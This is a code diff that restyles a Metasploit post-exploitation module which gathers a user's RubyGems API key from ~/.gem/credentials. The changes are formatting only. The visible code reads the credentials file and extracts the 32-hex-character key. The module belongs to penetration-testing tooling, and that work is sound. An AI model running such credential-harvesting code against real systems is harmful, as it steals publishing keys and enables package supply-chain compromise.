@@ -8,19 +8,22 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Unix
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'         => 'Multi Gather RubyGems API Key',
-      'Description'  => %q{
-        This module obtains a user's RubyGems API key from ~/.gem/credentials.
-      },
-      'Author'       => [
-        'Jonathan Claudius <jclaudius[at]trustwave.com>',
-        'Brandon Myers <bmyers[at]trustwave.com>'
-      ],
-      'Platform'     => %w{bsd linux osx unix},
-      'SessionTypes' => %w{shell},
-      'License'      => MSF_LICENSE
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Gather RubyGems API Key',
+        'Description' => %q{
+          This module obtains a user's RubyGems API key from ~/.gem/credentials.
+        },
+        'Author' => [
+          'Jonathan Claudius <jclaudius[at]trustwave.com>',
+          'Brandon Myers <bmyers[at]trustwave.com>'
+        ],
+        'Platform' => %w[bsd linux osx unix],
+        'SessionTypes' => %w[shell],
+        'License' => MSF_LICENSE
+      )
+    )
   end
 
   def run
@@ -45,7 +48,7 @@ class MetasploitModule < Msf::Post
   def extract_key(path)
     data = read_file(path)
     keys = data.split(':').select { |k| k =~ /[0-9a-f]{32}/ }
-    keys.map { |k| k.strip }.first
+    keys.map(&:strip).first
   end
 
   def download_key(paths)
